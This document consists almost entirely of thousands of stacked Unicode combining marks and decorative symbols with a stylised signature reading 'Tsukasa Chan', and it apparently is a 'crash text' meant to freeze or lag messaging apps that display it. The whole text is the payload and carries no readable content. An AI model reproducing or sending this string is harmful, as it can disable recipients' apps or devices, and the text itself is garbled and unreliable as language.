ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝.⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙ุᡃᡃᡃᡃᡃᡃᡃᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ✘͢͢ۦོ͢⇣͢✰͢↬✘͢͢ۦོ͢⇣͢✰͢↬❂⃢⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊❂❂⃟⃢͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟❂⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟❂⃢⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽❂⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟❂⃢⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊❂❂⃟⃢͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟❂⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟✘͢͢ۦོ͢⇣͢✰͢↬<\ 𝕿𝖘𝖚𝖐𝖆𝖘𝖆͜͡ 𝕮𝖍𝖆𝖓.々ʹ⁩𝜘͢͢ۦོ͢⇣͢✰͢𓊑𓀦𓀗𓀦𓀗𓊑ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝.⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙ุᡃᡃᡃᡃᡃᡃᡃᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ<\ 𝕿𝖘𝖚𝖐𝖆𝖘𝖆͜͡ 𝕮𝖍𝖆𝖓.々ʹ⁩𝜘͢͢ۦོ͢⇣͢✰͢ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝